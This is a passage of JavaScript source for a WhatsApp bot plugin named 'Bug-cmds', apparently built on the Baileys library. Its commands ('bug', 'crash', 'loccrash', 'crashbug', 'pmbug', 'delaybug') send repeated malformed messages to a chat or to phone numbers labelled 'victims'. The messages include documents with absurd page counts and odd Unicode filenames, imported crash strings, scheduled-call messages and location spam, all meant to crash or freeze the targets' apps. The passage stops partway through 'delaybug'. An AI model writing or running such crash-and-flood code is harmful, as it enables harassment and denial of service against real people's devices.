const { ezra } = require("../fredi/ezra");
const { delay, loading, react } = require("../fredi/utils");
const moment = require("moment-timezone");
const conf = require("../set.js");
const fs = require("fs");
const path = require("path");
const {
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys");

// bug database
const { bugtext1 } = require("../fredi/fredi/bugtext1");
const { bugtext2 } = require("../fredi/fredi/bugtext2");
const { bugtext3 } = require("../fredi/fredi/bugtext3");
const { bugtext4 } = require("../fredi/fredi/bugtext4");
const { bugtext5 } = require("../fredi/fredi/bugtext5");
const { bugtext6 } = require("../fredi/fredi/bugtext6");
const { bugpdf } = require("../fredi/fredi/bugpdf.js");

const category = "Bug-cmds";
const reaction = "🤯";

const mess = {};
mess.prem = "You are not authorised to use this  command !!!";

const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
const whatsappRegex =
    /https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;

const timewisher = time => {
    if (time < "23:59:00") {
        return `Good Night 🌆`;
    } else if (time < "19:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "18:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "15:00:00") {
        return `Good Afternoon 🌅`;
    } else if (time < "11:00:00") {
        return `Good Morning 🌄`;
    } else if (time < "05:00:00") {
        return `Good Morning 🌄`;
    }
};

async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                var scheduledCallCreationMessage = generateWAMessageFromContent(
                    dest,
                    proto.Message.fromObject(bug),
                    { userJid: dest, quoted: ms }
                );
                try {
                    zk.relayMessage(
                        victim,
                        scheduledCallCreationMessage.message,
                        { messageId: scheduledCallCreationMessage.key.id }
                    );
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}

async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                try {
                    zk.sendMessage(victim, bug);
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}


// --cmds--

// bug menu
ezra(
    {
        nomCom: "bu",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre } = commandOptions;
        const mono = "```";
        const time = moment().tz(conf.TZ).format("HH:mm:ss");
        const versions = ["v1", "v2"];
        const version = versions[Math.floor(Math.random() * versions.length)];
        const menuImage = fs.readFileSync(
            path.resolve(
                path.join(__dirname, "..", "media", "deleted-message.jpg")
            )
        );
        const tumbUrl =
            "https://files.catbox.moe/kqegk1.jpg";
        let menu = `${mono}Hello✌️ ${ms.pushName}
${timewisher(time)}



┗❏${mono}`;
        switch (version) {
            case "v1":
                {
                    zk.sendMessage(
                        dest,
                        {
                            image: menuImage,
                            caption: menu
                        },
                        { quoted: ms }
                    );
                }
                break;
            case "v2":
                {
                    zk.sendMessage(
                        dest,
                        {
                            image: menuImage,
                            caption: menu,
                            contextInfo: {
                                mentionedJid: [ms.key.remoteJid],
                                forwardingScore: 9999999,
                                isForwarded: true,
                                externalAdReply: {
                                    showAdAttribution: true,
                                    title: `${conf.BOT}`,
                                    body: `Bot Created By ${conf.OWNER_NAME}`,
                                    thumbnail: { url: tumbUrl },
                                    thumbnailUrl: tumbUrl,
                                    previewType: "PHOTO",
                                    sourceUrl:
                                        "https://whatsapp.com/channel/0029VawCel7GOj9ktLjkxQ3g",
                                    mediaType: 1,
                                    renderLargerAbhinail: true
                                }
                            }
                        },
                        { quoted: ms }
                    );
                }
                break;
        }
    }
);

//bug
ezra(
    {
        nomCom: "bug",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        if (!superUser) return await repondre(mess.prem);

        // send loading message
        await loading(dest, zk);

        for (let i = 0; i < 25; i++) {
            const doc = { url: "./set.js" };
            await zk.sendMessage(dest, {
                document: doc,
                mimetype:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
                title: "bx.pdf",
                pageCount: 9999999999,
                thumbnail: {
                    url: "https://files.catbox.moe/6n60jv.jpg"
                },
                thumbnailUrl:
                    "https://files.catbox.moe/o0lra6.jpg",
                jpegThumbnail: {
                    url: "https://files.catbox.moe/okdpc9.jpg"
                },
                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
                fileName:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
                    bugpdf
            });
        }
        await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
    }
);

//crash
ezra(
    {
        nomCom: "crash",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        const bug = bugtext6;
        if (!superUser) return await repondre(mess.prem);
        await loading(dest, zk);
        try {
            for (let i = 0; i < 10; i++) {
                await repondre(bug);
            }
        } catch (e) {
            await repondre(`an error occoured sending bugs`);
            console.log(`an error occured sending bugs : ${e}`);
            return;
        }
    }
);

//loccrash
ezra(
    {
        nomCom: "loccrash",
        reaction: "\uD83D\uDD16",
        categorie: category
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        await loading(dest, zk);

        for (let i = 0; i < 20; i++) {
            for (let j = 0; j < "3"; j++) {
                zk.sendMessage(
                    dest,
                    {
                        location: {
                            degreesLatitude: -6.28282828,
                            degreesLongitude: -1.2828,
                            name: "BRUX0N3RD\n\n\n\n\n\n\n\n"
                        }
                    },
                    { quoted: ms }
                );
            }
        }
        await zk.sendMessage(dest, { react: { text: "✅", key: ms.key } });
    }
);

//crashbug
ezra(
    {
        nomCom: "crashbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}crashbug amount | numbers\n> Example ${prefixe}crashbug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}crashbug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, zk);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const doc = { url: "./set.js" };
        const bug = {
            document: doc,
            mimetype:
                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
            title: "bx.pdf",
            pageCount: 9999999999,
            thumbnail: {
                url: "https://files.catbox.moe/yh1f2f.jpg"
            },
            thumbnailUrl:
                "https://files.catbox.moe/chblld.jpg",
            jpegThumbnail: {
                url: "https://files.catbox.moe/wa4jj9.jpg"
            },
            mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
            fileName:
                "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
                bugpdf
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await sendbug(dest, zk, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, zk, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (isNaN(amount)) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await sendbug(
                            dest,
                            zk,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, zk, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, zk, ms, "✅");
    }
);

// amountbug
ezra(
    {
        nomCom: "amountbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;

        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}amountbug amount\n> Example ${prefixe}amountbug 5`
            );

        const amount = parseInt(arg[0]);
        if (isNaN(amount) || amount > conf.BOOM_MESSAGE_LIMIT || amount < 1)
            return await repondre(
                `use a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
            );
        for (let i = 0; i < amount; i++) {
            const bug = `${bugtext1}`;
            var scheduledCallCreationMessage = generateWAMessageFromContent(
                dest,
                proto.Message.fromObject({
                    scheduledCallCreationMessage: {
                        callType: "2",
                        scheduledTimestampMs: `${moment(1000)
                            .tz("KENYA/ELDORET")
                            .format("DD/MM/YYYY HH:mm:ss")}`,
                        title: bug
                    }
                }),
                { userJid: dest, quoted: ms }
            );
            try {
                await zk.relayMessage(
                    victim,
                    scheduledCallCreationMessage.message,
                    { messageId: scheduledCallCreationMessage.key.id }
                );
            } catch (e) {
                await repondre(`An error occured while sending bugs`);
                console.log(`An error occured while sending bugs: ${e}`);
                return;
            }
            await delay(3000);
        }
        await repondre(
            `*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`
        );
        await react(dest, zk, ms, "✅");
    }
);

//pmbug
ezra(
    {
        nomCom: "pmbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, zk);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("KENYA/ELDORET")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: `${bugtext1}`
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, zk, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            zk,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, zk, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, zk, ms, "✅");
    }
);

//delaybug
ezra(
    {
        nomCom: "delaybug",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}delaybug amount | numbers\n> Example ${prefixe}delaybug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}delaybug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, zk);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("KENYA/ELDORET")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: bugtext2
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
            } catch (e) {
        
